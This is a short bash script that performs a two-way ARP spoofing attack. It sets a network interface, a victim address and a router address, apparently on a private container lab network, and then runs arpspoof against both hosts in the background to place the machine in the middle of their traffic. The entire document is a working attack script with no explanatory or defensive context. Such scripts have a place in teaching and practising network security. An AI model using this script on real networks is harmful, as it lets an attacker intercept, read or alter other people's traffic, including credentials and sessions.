#!/bin/bash

# Define variables
INTERFACE="eth0"
VICTIM_IP="172.18.0.3"
ROUTER_IP="172.18.0.1"

# Spoof ARP tables
arpspoof -i $INTERFACE -t $VICTIM_IP $ROUTER_IP &
arpspoof -i $INTERFACE -t $ROUTER_IP $VICTIM_IP &
